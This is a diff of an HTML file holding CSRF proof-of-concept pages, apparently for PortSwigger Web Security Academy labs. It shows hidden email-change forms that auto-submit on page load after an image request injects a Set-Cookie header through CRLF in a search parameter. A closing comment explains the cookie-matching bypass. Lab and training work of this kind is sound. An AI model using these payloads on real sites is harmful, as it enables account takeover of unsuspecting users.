@@ -1,24 +1,19 @@
+<!DOCTYPE html>
 <html>
-<body>
-	<iframe name="csrf-iframe" style="display:none"></iframe>
-	<form method="post" id="csrf-form" action="https://0a1d001c04bb247c8066213c009c00df.web-security-academy.net/my-account/change-email" target="csrf-iframe">
-		<input type="hidden" name="email" value="hacker@email.com">
-        <input type="hidden" name="csrf" value="1UshZ8fsD1BmZ5LSdenYfolS0iYnaQBk">
-	</form>
-    
-    <img src="https://0a1d001c04bb247c8066213c009c00df.web-security-academy.net/?search=john_wick%0d%0aSet-Cookie:%20csrfKey=hHL5XRKSZ06yILGn8dOAut0OO5mOj6AZ%3b%20SameSite=None" onerror="document.forms[0].submit()">
-</body>
+  <body>
+
+    <form action="https://0a4700f504d6c5168225d3a4001c0068.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacker123@gmail.com">
+      <input type="hidden" name="csrf" value="anything">
+    </form>
+
+    <img src="https://0a4700f504d6c5168225d3a4001c0068.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=anything%3b%20SameSite=None" onerror="document.forms[0].submit();">
+  </body>
 </html>
 
-
-<html>
-    <body>
-        <h1>Hello World!</h1>
-        <form action="https://0af600d7041a876284a7454800a100f1.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
-            <input type="hidden" name="email" value="test5@test.ca">
-            <input type="hidden" name="csrf" value="GDnsLDhOZ6q0AVroSCPEKYsy7n5jLHgr">
-        </form>
-
-        <img src="https://0af600d7041a876284a7454800a100f1.web-security-academy.net/?search=john_wick%0d%0aSet-Cookie:%20csrfKey=6d2R44IgBhkqvVKiq793DcTNz4VDH3NI" onerror="document.forms[0].submit()">
-    </body>
-</html>
+<!-- 
+The request will be accepted as long as the cookie and the csrf key are have the same value.
+I can set the csrf key to anything, but I cannot set the cookie.
+In the search request, a cookie is set to store the last search value.
+That can be used to inject a cookie to make it the same value as the csrf key.
+-->
